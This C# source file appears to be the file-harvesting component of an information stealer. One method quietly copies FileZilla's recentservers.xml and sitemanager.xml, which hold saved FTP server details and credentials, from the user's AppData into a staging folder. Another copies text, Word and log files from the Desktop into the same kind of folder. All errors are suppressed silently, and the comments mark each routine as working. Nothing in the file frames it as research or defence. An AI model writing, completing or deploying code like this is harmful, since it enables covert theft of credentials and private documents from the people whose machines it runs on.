using System;
using System.Collections.Generic;
using System.IO;
//using System.Linq;
using System.Text;
namespace NoFile
{
    class Files
    {
        public static void FileZilla(string path) // Works
        {
            Directory.CreateDirectory(path + "\\Filezilla");
            try
            {
                File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml", path + "\\Filezilla\\filezilla_recentservers.xml", true);
            }
            catch
            {
            }
            try
            {
                File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\sitemanager.xml", path + "\\Filezilla\\filezilla_sitemanager.xml", true);
            }
            catch
            {
            }
        }
        
        public static void Desktop(string directorypath) // Works
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)).GetFiles())
                {
                    if (file.Extension.Equals(".txt") || file.Extension.Equals(".doc") || file.Extension.Equals(".docx") || file.Extension.Equals(".log"))
                    {
                        Directory.CreateDirectory(directorypath + "\\Desktop\\");
                        file.CopyTo(directorypath + "\\Desktop\\" + file.Name);
                    }
                }
            }
            catch (Exception ex)
            {
                 // //Console.WriteLine(ex.ToString());
            }
        }
    }
}
